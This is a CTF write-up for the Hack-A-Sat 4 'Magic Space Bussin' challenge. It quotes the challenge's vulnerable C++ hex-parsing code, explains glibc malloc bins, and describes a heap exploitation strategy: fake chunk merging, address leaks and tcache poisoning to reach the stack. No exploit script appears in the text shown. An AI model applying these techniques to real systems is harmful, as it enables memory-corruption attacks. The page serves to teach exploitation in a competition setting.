@@ -1,0 +1,1025 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Hack-A-Sat 4: Magic Space Bussin :: CyberTaskForce Zero</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="I hate embedded SWEs. Always talking about how you should preallocate all the memory you need in the data section if you&#39;re using a bus. This isn&#39;t the 90s anymore. The heap is bussin fr fr.
+Don&#39;t trust me? Fine. You&#39;re more than welcome to test my spacebus implementation." />
+<meta name="keywords" content="ctf tu-bs stratum0" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/posts/hackasat4-magic-space-bussin/" />
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="/img/favicon/orange.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Hack-A-Sat 4: Magic Space Bussin">
+<meta property="og:description" content="I hate embedded SWEs. Always talking about how you should preallocate all the memory you need in the data section if you&#39;re using a bus. This isn&#39;t the 90s anymore. The heap is bussin fr fr.
+Don&#39;t trust me? Fine. You&#39;re more than welcome to test my spacebus implementation." />
+<meta property="og:url" content="/posts/hackasat4-magic-space-bussin/" />
+<meta property="og:site_name" content="CyberTaskForce Zero" />
+
+  
+    <meta property="og:image" content="/img/favicon/orange.png">
+  
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2023-04-05 18:42:00 &#43;0200 CEST" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="orange">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    CTF0
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="/posts/hackasat4-magic-space-bussin/">Hack-A-Sat 4: Magic Space Bussin</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2023-04-05
+        
+      </span>
+    
+    
+      <span class="post-author">:: Minei3oat</span>
+    
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="/tags/pwn/">pwn</a>&nbsp;
+    
+  </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="disclaimer">Disclaimer<a href="#disclaimer" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>We played as part of <a href="https://ctftime.org/team/54748">Sauercloud</a>.</p>
+<h1 id="challenge">Challenge<a href="#challenge" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>The source code, the compiled binary and a Dockerfile are provided with the challenge. Furthermore, there is a <code>malloc.c</code> next to the binary. The <code>malloc.c</code> is the one from glibc 2.32. In contrast to this, the provided Dockerfile builds on Ubuntu 20.04, which uses glibc 2.31. Since there were some major changes in the malloc code between those two versions, we later have to figure out the one used on the challenge.</p>
+<p>The challenge itself offers a space bus with two pipes. We can post and receive messages from and to both pipes. Messages are read in the same order as they are posted. The messages can be provided as raw bytes or as hex.</p>
+<h1 id="vulnerability">Vulnerability<a href="#vulnerability" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>While reading the source code, we identified a problem in case the message is provided as hex. The functions for calculating the payload length and allocating the buffer calculate the length differently:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span>size_t SB_Pipe<span style="color:#f92672">::</span>CalcPayloadLen(<span style="color:#66d9ef">bool</span> ishex, <span style="color:#66d9ef">const</span> std<span style="color:#f92672">::</span>string<span style="color:#f92672">&amp;</span> s){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(ishex <span style="color:#f92672">&amp;&amp;</span> (s.length() <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> s.length() <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> s.length();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">uint8_t</span><span style="color:#f92672">*</span> SB_Pipe<span style="color:#f92672">::</span>AllocatePlBuff(<span style="color:#66d9ef">bool</span> ishex, <span style="color:#66d9ef">const</span> std<span style="color:#f92672">::</span>string<span style="color:#f92672">&amp;</span> s){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(ishex){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">uint8_t</span>[s.length() <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">uint8_t</span>[s.length()];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>In combination with the parsing of the message payload, this results in two different useful cases when providing the payload as hex.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span>SB_Msg<span style="color:#f92672">*</span> SB_Pipe<span style="color:#f92672">::</span>ParsePayload(<span style="color:#66d9ef">const</span> std<span style="color:#f92672">::</span>string<span style="color:#f92672">&amp;</span> s, <span style="color:#66d9ef">bool</span> ishex, <span style="color:#66d9ef">uint8_t</span> pipe_id, <span style="color:#66d9ef">uint8_t</span> msg_id){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(s.length() <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nullptr</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint8_t</span><span style="color:#f92672">*</span> msg_s <span style="color:#f92672">=</span> AllocatePlBuff(ishex, s);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(ishex){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> cur_byte[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span>(size_t i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> CalcPayloadLen(ishex, s); i<span style="color:#f92672">+=</span><span style="color:#ae81ff">2</span>, j<span style="color:#f92672">++</span>){
+</span></span><span style="display:flex;"><span>            cur_byte[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> s[i];
+</span></span><span style="display:flex;"><span>            cur_byte[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> s[i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>];
+</span></span><span style="display:flex;"><span>            msg_s[j] <span style="color:#f92672">=</span> <span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">uint8_t</span><span style="color:#f92672">&gt;</span>(std<span style="color:#f92672">::</span>strtol(cur_byte, <span style="color:#66d9ef">nullptr</span>, <span style="color:#ae81ff">16</span>));
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span>(size_t i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> CalcPayloadLen(ishex, s); i<span style="color:#f92672">++</span>){
+</span></span><span style="display:flex;"><span>            msg_s[i] <span style="color:#f92672">=</span> <span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">uint8_t</span><span style="color:#f92672">&gt;</span>(s[i]);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    SB_Msg<span style="color:#f92672">*</span> payload <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SB_Msg{
+</span></span><span style="display:flex;"><span>        msg_s,
+</span></span><span style="display:flex;"><span>        pipe_id,
+</span></span><span style="display:flex;"><span>        msg_id,
+</span></span><span style="display:flex;"><span>        CalcPayloadLen(ishex, s)
+</span></span><span style="display:flex;"><span>    };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>If the length is even, a buffer of length <code>n/2</code> will be allocated in <code>AllocatePlBuff</code>. Since <code>CalcPayloadLen</code> also divides the length by two, only the first half of the payload will be written to the buffer, leaving the second half of the buffer untouched, resulting in a memory leak.</p>
+<p>If the length is odd, a buffer of length <code>(n-1)/2</code> will be allocated in <code>AllocatePlBuff</code>. Since <code>CalcPayloadLen</code> returns the exact length and <code>i</code> is always even, the last iteration of the loop will overflow the allocated buffer by one byte. Since the last hex char and the terminating null byte are copied to the translation buffer, the lower half of the overflown byte will be set to the provided hex value while the upper half will be set to zero. Furthermore, the length of the message is set to the length of the hex string, resulting in a buffer over-read when receiving a test message (message id 100).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span>size_t StarTracker<span style="color:#f92672">::</span>test_msg(SB_Msg<span style="color:#f92672">*</span> msg){ <span style="color:#75715e">// 100
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(size_t i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> msg<span style="color:#f92672">-&gt;</span>size; i<span style="color:#f92672">++</span>){
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;%#x &#34;</span>, msg<span style="color:#f92672">-&gt;</span>data[i]);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> SB_SUCCESS;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>As a result, the second case is very useful. The over-read can be used to leak the heap and glibc address, while the overflow can be leveraged to compromise the heap and allocate buffers at arbitrary locations. But let&rsquo;s first start with the basics of the heap to further understand this strategy.</p>
+<h1 id="malloc">malloc<a href="#malloc" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>The <code>new</code> operator in C++ uses <code>malloc</code> to get the needed buffer for the newly created object. <code>malloc</code> manages memory in chunks with sizes of multiples of 16 bytes. Each chunk consists of a header containing the size of the current and previous chunk and a body for the user data. If the chunks are free, the user space of the chunk is used for storing the free chunks in lists. Since the previous size field is only needed for merging with the previous chunk, it is only present in free chunks and used for storing user data if the previous chunk is in use. The least significant bits of the size field are used for storing flags, since they would otherwise always be unset. The most important one is the previous in use flag stored in the least significant bit. It is set if the previous chunk is in use. The other two flags signal are set if the chunk was allocated via <code>mmap</code> or does not belong to the main arena.</p>
+
+
+
+<div class="goat svg-container ">
+  
+    <svg
+      xmlns="http://www.w3.org/2000/svg"
+      font-family="Menlo,Lucida Console,monospace"
+      
+        viewBox="0 0 472 281"
+      >
+      <g transform='translate(8,16)'>
+<path d='M 104,0 L 112,0' fill='none' stroke='currentColor'></path>
+<path d='M 136,0 L 336,0' fill='none' stroke='currentColor'></path>
+<path d='M 96,32 L 104,32' fill='none' stroke='currentColor'></path>
+<path d='M 152,32 L 320,32' fill='none' stroke='currentColor'></path>
+<path d='M 104,64 L 112,64' fill='none' stroke='currentColor'></path>
+<path d='M 152,64 L 320,64' fill='none' stroke='currentColor'></path>
+<path d='M 360,64 L 368,64' fill='none' stroke='currentColor'></path>
+<path d='M 152,96 L 320,96' fill='none' stroke='currentColor'></path>
+<path d='M 152,128 L 320,128' fill='none' stroke='currentColor'></path>
+<path d='M 368,144 L 376,144' fill='none' stroke='currentColor'></path>
+<path d='M 152,160 L 320,160' fill='none' stroke='currentColor'></path>
+<path d='M 104,192 L 112,192' fill='none' stroke='currentColor'></path>
+<path d='M 136,192 L 336,192' fill='none' stroke='currentColor'></path>
+<path d='M 96,224 L 104,224' fill='none' stroke='currentColor'></path>
+<path d='M 152,224 L 320,224' fill='none' stroke='currentColor'></path>
+<path d='M 360,224 L 368,224' fill='none' stroke='currentColor'></path>
+<path d='M 104,256 L 112,256' fill='none' stroke='currentColor'></path>
+<path d='M 152,256 L 320,256' fill='none' stroke='currentColor'></path>
+<path d='M 104,0 L 104,32' fill='none' stroke='currentColor'></path>
+<path d='M 104,32 L 104,64' fill='none' stroke='currentColor'></path>
+<path d='M 104,192 L 104,224' fill='none' stroke='currentColor'></path>
+<path d='M 104,224 L 104,256' fill='none' stroke='currentColor'></path>
+<path d='M 136,0 L 136,192' fill='none' stroke='currentColor'></path>
+<path d='M 136,192 L 136,256' fill='none' stroke='currentColor'></path>
+<path d='M 336,0 L 336,192' fill='none' stroke='currentColor'></path>
+<path d='M 336,192 L 336,256' fill='none' stroke='currentColor'></path>
+<path d='M 368,64 L 368,144' fill='none' stroke='currentColor'></path>
+<path d='M 368,144 L 368,224' fill='none' stroke='currentColor'></path>
+<text text-anchor='middle' x='0' y='228' fill='currentColor' style='font-size:1em'>n</text>
+<text text-anchor='middle' x='8' y='228' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='16' y='228' fill='currentColor' style='font-size:1em'>x</text>
+<text text-anchor='middle' x='24' y='228' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='40' y='36' fill='currentColor' style='font-size:1em'>h</text>
+<text text-anchor='middle' x='40' y='228' fill='currentColor' style='font-size:1em'>h</text>
+<text text-anchor='middle' x='48' y='36' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='48' y='228' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='56' y='36' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='56' y='228' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='64' y='36' fill='currentColor' style='font-size:1em'>d</text>
+<text text-anchor='middle' x='64' y='228' fill='currentColor' style='font-size:1em'>d</text>
+<text text-anchor='middle' x='72' y='36' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='72' y='228' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='80' y='36' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='80' y='228' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='160' y='20' fill='currentColor' style='font-size:1em'>s</text>
+<text text-anchor='middle' x='160' y='52' fill='currentColor' style='font-size:1em'>s</text>
+<text text-anchor='middle' x='160' y='84' fill='currentColor' style='font-size:1em'>f</text>
+<text text-anchor='middle' x='160' y='116' fill='currentColor' style='font-size:1em'>b</text>
+<text text-anchor='middle' x='160' y='148' fill='currentColor' style='font-size:1em'>n</text>
+<text text-anchor='middle' x='160' y='180' fill='currentColor' style='font-size:1em'>p</text>
+<text text-anchor='middle' x='160' y='212' fill='currentColor' style='font-size:1em'>s</text>
+<text text-anchor='middle' x='160' y='244' fill='currentColor' style='font-size:1em'>s</text>
+<text text-anchor='middle' x='168' y='20' fill='currentColor' style='font-size:1em'>i</text>
+<text text-anchor='middle' x='168' y='52' fill='currentColor' style='font-size:1em'>i</text>
+<text text-anchor='middle' x='168' y='84' fill='currentColor' style='font-size:1em'>o</text>
+<text text-anchor='middle' x='168' y='116' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='168' y='148' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='168' y='180' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='168' y='212' fill='currentColor' style='font-size:1em'>i</text>
+<text text-anchor='middle' x='168' y='244' fill='currentColor' style='font-size:1em'>i</text>
+<text text-anchor='middle' x='176' y='20' fill='currentColor' style='font-size:1em'>z</text>
+<text text-anchor='middle' x='176' y='52' fill='currentColor' style='font-size:1em'>z</text>
+<text text-anchor='middle' x='176' y='84' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='176' y='116' fill='currentColor' style='font-size:1em'>c</text>
+<text text-anchor='middle' x='176' y='148' fill='currentColor' style='font-size:1em'>x</text>
+<text text-anchor='middle' x='176' y='180' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='176' y='212' fill='currentColor' style='font-size:1em'>z</text>
+<text text-anchor='middle' x='176' y='244' fill='currentColor' style='font-size:1em'>z</text>
+<text text-anchor='middle' x='184' y='20' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='184' y='52' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='184' y='84' fill='currentColor' style='font-size:1em'>w</text>
+<text text-anchor='middle' x='184' y='116' fill='currentColor' style='font-size:1em'>k</text>
+<text text-anchor='middle' x='184' y='148' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='184' y='180' fill='currentColor' style='font-size:1em'>v</text>
+<text text-anchor='middle' x='184' y='212' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='184' y='244' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='192' y='84' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='192' y='116' fill='currentColor' style='font-size:1em'>w</text>
+<text text-anchor='middle' x='200' y='20' fill='currentColor' style='font-size:1em'>o</text>
+<text text-anchor='middle' x='200' y='84' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='200' y='116' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='200' y='148' fill='currentColor' style='font-size:1em'>s</text>
+<text text-anchor='middle' x='200' y='180' fill='currentColor' style='font-size:1em'>s</text>
+<text text-anchor='middle' x='200' y='244' fill='currentColor' style='font-size:1em'>o</text>
+<text text-anchor='middle' x='208' y='20' fill='currentColor' style='font-size:1em'>f</text>
+<text text-anchor='middle' x='208' y='84' fill='currentColor' style='font-size:1em'>d</text>
+<text text-anchor='middle' x='208' y='116' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='208' y='148' fill='currentColor' style='font-size:1em'>i</text>
+<text text-anchor='middle' x='208' y='180' fill='currentColor' style='font-size:1em'>i</text>
+<text text-anchor='middle' x='208' y='244' fill='currentColor' style='font-size:1em'>f</text>
+<text text-anchor='middle' x='216' y='116' fill='currentColor' style='font-size:1em'>d</text>
+<text text-anchor='middle' x='216' y='148' fill='currentColor' style='font-size:1em'>z</text>
+<text text-anchor='middle' x='216' y='180' fill='currentColor' style='font-size:1em'>z</text>
+<text text-anchor='middle' x='224' y='20' fill='currentColor' style='font-size:1em'>p</text>
+<text text-anchor='middle' x='224' y='84' fill='currentColor' style='font-size:1em'>p</text>
+<text text-anchor='middle' x='224' y='148' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='224' y='180' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='224' y='244' fill='currentColor' style='font-size:1em'>n</text>
+<text text-anchor='middle' x='232' y='20' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='232' y='84' fill='currentColor' style='font-size:1em'>o</text>
+<text text-anchor='middle' x='232' y='116' fill='currentColor' style='font-size:1em'>p</text>
+<text text-anchor='middle' x='232' y='244' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='240' y='20' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='240' y='84' fill='currentColor' style='font-size:1em'>i</text>
+<text text-anchor='middle' x='240' y='116' fill='currentColor' style='font-size:1em'>o</text>
+<text text-anchor='middle' x='240' y='148' fill='currentColor' style='font-size:1em'>p</text>
+<text text-anchor='middle' x='240' y='180' fill='currentColor' style='font-size:1em'>p</text>
+<text text-anchor='middle' x='240' y='244' fill='currentColor' style='font-size:1em'>x</text>
+<text text-anchor='middle' x='248' y='20' fill='currentColor' style='font-size:1em'>v</text>
+<text text-anchor='middle' x='248' y='84' fill='currentColor' style='font-size:1em'>n</text>
+<text text-anchor='middle' x='248' y='116' fill='currentColor' style='font-size:1em'>i</text>
+<text text-anchor='middle' x='248' y='148' fill='currentColor' style='font-size:1em'>o</text>
+<text text-anchor='middle' x='248' y='180' fill='currentColor' style='font-size:1em'>o</text>
+<text text-anchor='middle' x='248' y='244' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='256' y='20' fill='currentColor' style='font-size:1em'>i</text>
+<text text-anchor='middle' x='256' y='84' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='256' y='116' fill='currentColor' style='font-size:1em'>n</text>
+<text text-anchor='middle' x='256' y='148' fill='currentColor' style='font-size:1em'>i</text>
+<text text-anchor='middle' x='256' y='180' fill='currentColor' style='font-size:1em'>i</text>
+<text text-anchor='middle' x='264' y='20' fill='currentColor' style='font-size:1em'>o</text>
+<text text-anchor='middle' x='264' y='52' fill='currentColor' style='font-size:1em'>|</text>
+<text text-anchor='middle' x='264' y='84' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='264' y='116' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='264' y='148' fill='currentColor' style='font-size:1em'>n</text>
+<text text-anchor='middle' x='264' y='180' fill='currentColor' style='font-size:1em'>n</text>
+<text text-anchor='middle' x='264' y='244' fill='currentColor' style='font-size:1em'>|</text>
+<text text-anchor='middle' x='272' y='20' fill='currentColor' style='font-size:1em'>u</text>
+<text text-anchor='middle' x='272' y='84' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='272' y='116' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='272' y='148' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='272' y='180' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='280' y='20' fill='currentColor' style='font-size:1em'>s</text>
+<text text-anchor='middle' x='280' y='52' fill='currentColor' style='font-size:1em'>f</text>
+<text text-anchor='middle' x='280' y='116' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='280' y='148' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='280' y='180' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='280' y='244' fill='currentColor' style='font-size:1em'>f</text>
+<text text-anchor='middle' x='288' y='52' fill='currentColor' style='font-size:1em'>l</text>
+<text text-anchor='middle' x='288' y='148' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='288' y='180' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='288' y='244' fill='currentColor' style='font-size:1em'>l</text>
+<text text-anchor='middle' x='296' y='52' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='296' y='244' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='304' y='52' fill='currentColor' style='font-size:1em'>g</text>
+<text text-anchor='middle' x='304' y='244' fill='currentColor' style='font-size:1em'>g</text>
+<text text-anchor='middle' x='312' y='52' fill='currentColor' style='font-size:1em'>s</text>
+<text text-anchor='middle' x='312' y='244' fill='currentColor' style='font-size:1em'>s</text>
+<text text-anchor='middle' x='392' y='148' fill='currentColor' style='font-size:1em'>u</text>
+<text text-anchor='middle' x='400' y='148' fill='currentColor' style='font-size:1em'>s</text>
+<text text-anchor='middle' x='408' y='148' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='416' y='148' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='432' y='148' fill='currentColor' style='font-size:1em'>d</text>
+<text text-anchor='middle' x='440' y='148' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='448' y='148' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='456' y='148' fill='currentColor' style='font-size:1em'>a</text>
+</g>
+
+    </svg>
+  
+</div>
+<p>An arena is a collection of one or more large memory regions that share the same lists of free chunks. If only a small number of threads is used, each thread will have it&rsquo;s own arena. While the main arena is allocated close after the application, the other arenas will be mapped directly above the glibc. Since the challenge uses only one thread, the main arena will be used.</p>
+<p>Free chunks are stored in bins. There are five different bin types:</p>
+<ul>
+<li>tcache bins</li>
+<li>fast bins</li>
+<li>unsorted bin</li>
+<li>small bins</li>
+<li>large bins</li>
+</ul>
+<p>There are two types of bins: tcache and fast bins that store the chunks in a singly linked list and the unsorted bin and small and large bins that use doubly linked lists for storing their chunks. While tcache, fast bins and small bins store only chunks of exactly one size, the unsorted bin and large bins store chunks of multiple sizes. Because of that and since only chunks in large bins are ordered by size, the fields for pointers to the chunk of next and previous size are only used in large bins. The different bins feature different restrictions on the chunk size. Furthermore, tcache bins are limited to seven chunks in order to prevent chunk hoarding, as chunks in tcache are only accessible by one thread, while the other bins are used by all threads that use the arena.</p>
+<p><code>free</code> first tries to place the chunks into tcache and fast bins. All remaining chunks are marked as free, merged with adjacent chunks and queued into the unsorted bin.</p>
+<p><code>malloc</code> first tries to find a chunk of the requested size by searching the tcache, fast bin, small bin, unsorted bin and last the large bin. Bins of chunks with unsuitable size are skipped. While the unsorted bin is searched for a suitable chunk, the processed chunks are inserted in their corresponding small or large bin. In case of a large request, all chunks inside the fast bins are marked as free, merged with adjacent chunks and queued into the unsorted bin. If no suitable chunk is found, <code>malloc</code> will try to split a bigger chunk. If that also fails, the top chunk, which is in no list, will be split and the heap expanded if the top chunk is to small.</p>
+<h1 id="strategy">Strategy<a href="#strategy" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Since the x86 architecture stores integers in little-endian, the flags of the chunk header are stored in the lower half of the first byte following the previous chunk. This allows us to leverage the half byte overflow to set the flags of the next chunk. If we unset the previous in use bit and create a fake chunk with valid pointers, a valid header and a corresponding previous size field, we can trigger a merge with the next chunk. This will create a chunk overlapping with our chunk, enabling us to overwrite the pointers of the merged chunk.</p>
+<p>The fake chunk must be removable from a doubly linked list. To accomplish this, we will point the forward and backward pointers to the fake chunk itself. This will bypass the consistency checks (<code>P-&gt;bk-&gt;fd == P &amp;&amp; P-&gt;fd-&gt;bk == P</code>) and allows the relinking of the next and previous chunks in our faked list. The needed heap leek can be received by the over-read of chunk followed by a chunk in a tcache or fast bin. Furthermore we will set the previous in use flag of the fake chunk to skip some tests and to prevent later merging with the non-existing previous chunk.</p>
+<p>To trigger the merging of our fake chunk with the next chunk, we have to free the next chunk into the unsorted bin. Since the upper half of the least significant byte will be set to zero, the size of the next chunk has to be a multiple of 256 bytes to pass the performed consistency checks. As fast bins only store chunks up to 128 bytes, we do not need to worry about the next chunk being freed into a fast bin. The freeing into a tcache bin can be prevented in two ways: The next chunk can either be larger than the largest tcache bin (1040 bytes) or we can free seven chunks of the same size in advance to occupy all slots.</p>
+<p>Since the flag is stored as environment variable, it is saved at the bottom of the stack. As the position of the stack is randomized, we first need to find a pointer to the stack before we can access it. Luckily, all recent glibc versions feature one close after the main arena. In case of the glibc 2.31 used in this challenge, there is a pointer to the <code>program_invocation_short_name</code>, i.e. a part of the arguments used to call the program. These are stored directly before the environment variables and thereby allow us to access the flag. Since the doubly linked lists are an entry in their own list, we can leak the address of the main arena by leveraging the over-read with a chunk that is the first or last entry in one of the doubly linked bins.</p>
+<p>After knowing the address of the pointer to the <code>program_invocation_short_name</code>, we can use the overflow into the merged fake chunk to corrupt the singly linked list of a tcache bin. Since neither the alignment nor the size of the chunk returned from a tcache bin is checked in glibc 2.31, subsequent calls to <code>malloc</code> will dereference the next pointers one after the other and, thereby, will eventually return a chunk located on the stack. Since <code>malloc</code> only pops a chunk from tcache if the counter is greater than zero, there need to be at least three chunks in the used bin: The one with the overflowable next pointer, a chunk that is replaced with glibc and the one that will be moved to the stack.</p>
